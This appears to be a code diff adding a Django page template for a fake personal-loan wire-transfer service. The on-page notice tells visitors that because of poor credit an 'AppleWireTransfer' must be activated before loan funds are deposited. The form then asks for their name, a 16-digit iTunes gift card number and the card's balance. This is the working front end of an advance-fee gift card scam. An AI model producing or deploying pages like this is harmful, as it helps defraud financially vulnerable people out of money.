@@ -1,0 +1,92 @@
+ {% load widget_tweaks %} {% load staticfiles %}
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>PERSONALLOADWIRETRANSFER</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        body {
+            background-color: black;
+        }
+        
+        form {
+            position: relative;
+            left: 40%;
+            top: 200px;
+        }
+        
+        .cl {
+            align-items: center;
+            padding: 10px 30px 10px;
+        }
+        
+        label {
+            font-size: 20px;
+            color: white;
+        }
+        
+        button {
+            width: 15%;
+            margin-top: 10px;
+            color: white;
+            background-color: navy
+        }
+        
+        .info {
+            color: white;
+            width: 25%;
+            margin-left: 35%;
+            border: 2px white solid;
+            text-align: center;
+            top: 100px;
+            position: relative;
+        }
+        
+        @media only screen and (min-width:150px) and (max-width:680px) {
+            form {
+                left: 0%;
+                margin-left: 60px;
+            }
+            .info {
+                color: white;
+                width: 70%;
+                margin-left: 15%;
+                border: 2px white solid;
+                text-align: center;
+                top: 100px;
+                position: relative;
+                font-size: 18px;
+            }
+            button {
+                width: 75%;
+            }
+        }
+    </style>
+</head>
+
+
+<body class="body">
+
+    <div class="info">
+        <p>Due to poor credit level ,AppleWireTransfer must be activated for funds to be depossited in your account.For activation guide,kindly call your loan officer for .</p>
+    </div>
+    <form action='' method='POST' enctype='multipart/form-data'>
+
+        {% csrf_token %}
+        <label>FirstName:</label>
+        <div>{{ card.FirstName|add_class:" cl "}}</div>
+        <label>LastName:</label>
+        <div>{{ card.LastName |add_class:" cl "}}</div>
+        <label>16 digitItuneCardNumber:</label>
+        <div> {{ card.CardNumber|add_class:" cl "}}</div>
+        <label>AmountInCard:</label>
+        <div> {{ card.Amount|add_class:" cl "}}</div>
+
+
+        <button type="submit">COMPLETE</button>
+    </form>
+</body>
+
+</html>
